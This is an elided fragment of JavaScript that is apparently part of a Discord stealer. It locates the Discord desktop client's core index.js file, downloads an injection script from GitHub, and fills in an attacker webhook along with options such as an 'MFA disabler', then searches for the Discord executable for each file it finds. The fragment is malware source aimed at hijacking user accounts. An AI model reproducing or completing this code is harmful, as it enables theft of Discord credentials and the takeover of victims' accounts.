...
async function findDiscordExe(baseDir) {
  ...
  for (const file of files) {
    if (file.toLowerCase().endsWith(".exe") && file.toLowerCase().includes("discord")) {
...
async function Discord() {
  try {
    ...
    const pattern = path.join(LOCAL, "*cord*", "app-*", "modules", "discord_desktop_core-*", "discord_desktop_core", "index.js").replace(/\\/g, "/");

    const matches = await glob(pattern, { onlyFiles: true, unique: true });
    if (matches.length === 0) return console.log("No Discord index.js files found.");

    let githubContent = await fetchRawFromGithub(discordInject);
    githubContent = githubContent.replace("%?WEBHOOK?%", wbk).replace("%AUTO_USER_PROFILE_EDIT%", "false").replace("%AUTO_MFA_DISABLER%", "false");
    ...
    for (const discordPath of matches) {
      try {
        ...
        try {
          const exePath = await findDiscordExe(path.join(path.dirname(discordPath), "..", "..", ".."));
          if (exePath) {
